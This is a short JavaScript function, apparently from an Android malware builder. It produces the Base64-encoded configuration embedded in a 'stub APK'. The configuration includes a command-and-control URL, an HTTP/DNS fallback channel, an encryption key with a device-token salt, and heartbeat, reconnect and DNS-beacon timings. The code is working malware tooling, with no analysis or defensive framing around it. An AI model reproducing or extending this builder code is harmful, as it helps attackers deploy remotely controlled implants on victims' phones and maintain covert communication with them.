/**
 * Generate the config JSON that gets embedded into the stub APK.
 * The stub APK uses this to know where to connect and how to decrypt.
 */
export function generateStubConfig(c2Url, encryptionKey, deviceToken) {
  const config = {
    c2: {
      primary: c2Url,
      fallback: `${c2Url.replace('ws', 'http')}/dns`,
    },
    crypto: {
      key: encryptionKey,
      salt: deviceToken.slice(0, 16),
    },
    device: {
      token: deviceToken,
    },
    intervals: {
      heartbeat: 30000,
      reconnect: 5000,
      dnsBeacon: 60000,
    },
  };

  // Base64-encode the config for easy embedding
  const encoded = Buffer.from(JSON.stringify(config)).toString('base64');

  return encoded;
}
